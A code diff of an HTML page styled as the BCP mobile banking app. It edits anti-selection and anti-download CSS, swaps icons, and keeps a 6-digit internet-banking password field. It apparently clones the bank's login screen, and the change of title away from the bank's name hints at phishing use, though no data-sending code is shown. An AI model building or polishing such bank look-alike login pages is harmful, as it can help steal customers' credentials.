@@ -5,40 +5,42 @@
      <link rel="apple-touch-icon" href="app-icon.png">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Banca Móvil BCP</title>
+    <title>Bienvenido</title>
     <meta name="theme-color" content="#002a80">
     <link rel="manifest" href="manifest.json?v=2">
     <style>
         * {
-    /* Elimina el recuadro azul al hacer clic en celulares */
-    -webkit-tap-highlight-color: transparent;
-    outline: none !important;
-    
-    /* Bloquea la selección de texto en toda la app */
-    -webkit-user-select: none; 
-    -moz-user-select: none; 
-    -ms-user-select: none; 
-    user-select: none; 
-}
-
-/* Excepción para que sí se pueda seleccionar/escribir en los inputs */
-input, textarea {
-    -webkit-user-select: auto;
-    -moz-user-select: auto;
-    -ms-user-select: auto;
-    user-select: auto;
-}
-
-/* Bloquea el menú de descarga al mantener presionadas las imágenes */
-img {
-    -webkit-touch-callout: none !important;
-    -webkit-user-drag: none !important;
-}
-
-        * {
-            -webkit-tap-highlight-color: transparent;
-            outline: none;
+            /* Elimina el recuadro azul al hacer clic en celulares */
+            -webkit-tap-highlight-color: transparent !important;
+            outline: none !important;
+            
+            /* Bloquea la selección de texto en toda la app y menús táctiles */
+            -webkit-user-select: none !important; 
+            -moz-user-select: none !important; 
+            -ms-user-select: none !important; 
+            user-select: none !important; 
+            -webkit-touch-callout: none !important;
             box-sizing: border-box;
+        }
+
+        /* Excepción para que sí se pueda seleccionar/escribir en los inputs */
+        input, textarea {
+            -webkit-user-select: auto !important;
+            -moz-user-select: auto !important;
+            -ms-user-select: auto !important;
+            user-select: auto !important;
+        }
+
+        /* Bloquea estrictamente el menú de descarga y arrastre en imágenes */
+        img {
+            -webkit-touch-callout: none !important;
+            -webkit-user-drag: none !important;
+            pointer-events: none !important; 
+        }
+
+        /* Restauramos el clic exclusivamente para los íconos interactivos */
+        .top-icon, .eye-icon {
+            pointer-events: auto !important;
         }
 
         body {
@@ -133,7 +135,7 @@ img {
             filter: brightness(0) invert(1);
         }
 
-        .icon-circle img.yape-icon-large { width: 42px; height: 42px; }
+        .icon-circle img.yape-icon-large { width: 50px; height: 50px; }
 
         .shortcut-label {
             font-size: 15px;
@@ -250,14 +252,14 @@ img {
             
             <div class="shortcut-item">
                 <div class="icon-circle">
-                    <img src="img/Scan.svg" alt="QR">
+                    <img src="img/qr.webp" alt="QR">
                 </div>
                 <span class="shortcut-label">Pagar<br>con QR</span>
             </div>
             
             <div class="shortcut-item">
                 <div class="icon-circle">
-                    <img src="img/pagar-servicios.svg" alt="Servicios">
+                    <img src="img/aqua.webp" alt="Servicios">
                 </div>
                 <span class="shortcut-label">Pagar<br>servicios</span>
             </div>
@@ -273,7 +275,6 @@ img {
             </div>
 
             <div class="password-container">
-                <!-- Se agregó autocomplete="off" para evitar que el navegador sugiera el historial de claves -->
                 <input type="tel" id="passInput" class="password-input" placeholder="Clave de internet de 6 dígitos" maxlength="6" inputmode="numeric" autocomplete="off">
                 <img src="img/ojo-abierto-g-icon.svg" id="eyeIcon" alt="Ver" class="eye-icon" onclick="togglePassword()">
             </div>
